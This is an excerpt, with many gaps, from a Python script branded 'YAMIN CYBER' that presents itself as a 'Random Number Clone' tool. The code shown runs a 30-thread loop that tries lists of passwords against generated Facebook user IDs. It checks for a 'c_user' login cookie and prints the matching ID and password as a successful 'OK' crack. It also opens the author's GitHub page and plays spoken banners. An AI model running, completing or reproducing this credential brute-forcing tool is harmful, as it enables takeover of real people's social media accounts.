...
os.system('xdg-open https://github.com/SF-YAMIN CYBER')
...
┗┫┏┓┏┳┓┓┏┓  
┗┛┗┻┛┗┗┗┛┗                                                                                                                     
                                  \x1b[1;96mYAMIN CYBER \x1b[1;94mYAMIN CYBER \033[1;31mYAMIN CYBER \033[1;32mMAHMUD                                                  
     ...
     \x1b[1;96m Author       : \033[1;32m        YAMIN CYBER
     \x1b[1;96m Facebook     :  \033[1;32m       YAMIN CYBER 

     \x1b[1;96m GitHub       : \033[1;32m        YAMIN CYBER 
     ...
     \x1b[1;96m Version      : \033[1;32m           0.0.4
...
class Main:
    ...
    def __init__(self):
        ...
        os.system('espeak -a 200 "Welcome YAMIN CYBER project Random Clone"')
        ...
        print(" [01] RANDOM  NUMBER CLONE \033[1;34m[ULTRA WORKING Tested By YAMIN CYBER]")

        print(" [02] MY fACEBOOK ACCOUNT  \033[1;35m[YAMIN CYBER] ")
...
def num():
    ...
    with ThreadPool(max_workers=30) as noob:
        ...
        os.system('espeak -a 200 "Random cloning Started YAMIN CYBER"')
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        ...
        for ps in pwx:
            ...
            sys.stdout.write('\r[\033[1;92mYAMIN CYBER\033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] - [CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            ...
            if 'c_user' in log_cookies:
                ...
                print(f"\033[38;5;46m[YAMIN CYBER-OK💉] {uid} | {ps}")
        ...
        sys.stdout.write(f'\r\033[m[YAMIN CYBYAMIN📌] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
